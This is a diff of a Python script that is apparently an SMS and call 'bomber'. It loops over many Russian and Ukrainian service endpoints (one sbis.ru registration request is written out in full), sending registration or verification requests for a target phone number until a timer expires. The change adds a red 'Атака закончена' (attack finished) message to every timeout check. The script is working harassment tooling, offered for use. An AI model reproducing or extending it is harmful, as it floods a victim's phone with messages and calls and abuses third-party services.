@@ -1,16 +1,10 @@
+
 # -*- coding: utf-8 -*-
+#   Version 8.0
 
 import os
 import time
-import random
-import datetime
-import sys
-import time 
-import argparse 
-import os
-import requests
-import colorama
-
+import requests, random, datetime, sys, time, argparse, os , colorama
 from colorama import Fore, Back, Style
 from colorama import init
 init()
@@ -124,7 +118,10 @@ print(Fore.GREEN)
 
 iteration = 0
 while True:
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
     
     try:
 
@@ -135,7 +132,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -149,7 +149,10 @@ while True:
 
         print('[-] Не отправлено !')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -163,7 +166,10 @@ while True:
 
         print('[-] Не отправленo !')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -177,7 +183,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -191,7 +200,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -205,7 +217,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -219,7 +234,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break    
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break   
 
     try:
 
@@ -233,7 +251,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -247,7 +268,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -261,7 +285,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -275,7 +302,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break 
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -289,7 +319,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break    
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break   
 
     try:
 
@@ -303,7 +336,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -317,7 +353,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -331,7 +370,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -345,7 +387,10 @@ while True:
 
         print('[-]  не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -359,7 +404,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -373,7 +421,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break     
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break     
 
     try:
 
@@ -387,7 +438,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -401,7 +455,10 @@ while True:
 
         print('[+] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -415,7 +472,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -429,7 +489,10 @@ while True:
 
         print('[-] Kasta Не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break   
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break   
 
     try:
 
@@ -443,7 +506,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break   
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break  
 
     try:
 
@@ -457,7 +523,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -471,7 +540,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -485,7 +557,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -499,7 +574,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -514,7 +592,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -528,7 +609,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break   
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break 
 
     try:
 
@@ -542,7 +626,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -556,7 +643,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -570,7 +660,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -584,7 +677,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break    
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break  
 
     try:
 
@@ -598,7 +694,10 @@ while True:
 
         print('[-] Niyama не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -612,7 +711,10 @@ while True:
 
         print('[-] VSK не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -626,7 +728,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -640,7 +745,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break    
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break    
 
     try:
 
@@ -654,7 +762,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break    
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break   
 
     try:
 
@@ -668,7 +779,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -682,7 +796,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -696,7 +813,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -710,7 +830,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -724,7 +847,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -738,7 +864,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -752,7 +881,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break       
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break       
 
     try:
 
@@ -766,7 +898,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break    
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break    
 
     try:
 
@@ -780,7 +915,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -794,7 +932,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -808,7 +949,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -822,7 +966,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -836,7 +983,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -850,7 +1000,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -864,7 +1017,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -878,7 +1034,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -892,7 +1051,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -906,7 +1068,10 @@ while True:
 
         print('[+] не отправлено!')    
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -920,7 +1085,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -934,7 +1102,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -948,7 +1119,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -962,7 +1136,10 @@ while True:
 
         print('[-] Rutube in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -976,7 +1153,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -990,7 +1170,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1004,7 +1187,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1018,7 +1204,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1032,7 +1221,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1046,7 +1238,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1060,7 +1255,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1074,8 +1272,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
-
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
     try:
 
         requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
@@ -1088,7 +1288,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1102,7 +1305,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1116,7 +1322,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1130,7 +1339,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1144,7 +1356,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1158,7 +1373,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1172,7 +1390,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1186,7 +1407,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1200,7 +1424,10 @@ while True:
 
         print('[-] Звонок не отпрвлен !')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1214,7 +1441,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1228,7 +1458,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1242,7 +1475,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1256,7 +1492,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1270,7 +1509,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1284,7 +1526,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1298,7 +1543,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1312,7 +1560,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1326,7 +1577,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1339,7 +1593,10 @@ while True:
     except:
 
         print('[-] error in sent!')
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
 
     try:
@@ -1354,7 +1611,11 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break      
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
+
 
     try:
 
@@ -1368,7 +1629,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1382,7 +1646,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1394,7 +1661,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1408,7 +1678,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1422,7 +1695,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1436,7 +1712,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1450,7 +1729,11 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
+        
 
     try:
 
@@ -1464,7 +1747,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1478,7 +1764,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1492,7 +1781,11 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
+
 
     try:
 
